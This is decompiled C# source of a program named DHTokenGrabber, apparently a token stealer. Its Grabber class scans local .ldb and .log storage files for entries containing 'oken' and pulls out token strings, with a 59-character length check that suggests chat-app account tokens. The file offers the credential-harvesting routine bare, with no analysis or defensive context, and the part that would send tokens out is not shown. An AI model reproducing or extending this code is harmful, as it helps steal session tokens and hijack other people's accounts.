using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace DHTokenGrabber
{
	// Token: 0x02000002 RID: 2
	internal class Grabber
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static bool FindLdb(ref string path)
		{
			if (!Directory.Exists(path))
			{
				return false;
			}
			foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
			{
				if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
				{
					path += fileInfo.Name;
					break;
				}
			}
			return path.EndsWith(".ldb");
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020D4 File Offset: 0x000002D4
		public static bool FindLog(ref string path)
		{
			if (!Directory.Exists(path))
			{
				return false;
			}
			foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
			{
				if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
				{
					path += fileInfo.Name;
					break;
				}
			}
			return path.EndsWith(".log");
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002158 File Offset: 0x00000358
		public static string GetToken(string path, bool isLog = false)
		{
			byte[] bytes = File.ReadAllBytes(path);
			string @string = Encoding.UTF8.GetString(bytes);
			string text = "";
			string text2 = @string;
			while (text2.Contains("oken"))
			{
				string[] array = Grabber.Sub(text2).Split(new char[]
				{
					'"'
				});
				text = array[0];
				text2 = string.Join("\"", array);
				if (isLog && text.Length == 59)
				{
					break;
				}
			}
			return text;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021C4 File Offset: 0x000003C4
		private static string Sub(string contents)
		{
			string[] array = contents.Substring(contents.IndexOf("oken") + 4).Split(new char[]
			{
				'"'
			});
			List<string> list = new List<string>();
			list.AddRange(array);
			list.RemoveAt(0);
			array = list.ToArray();
			return string.Join("\"", array);
		}
	}
}
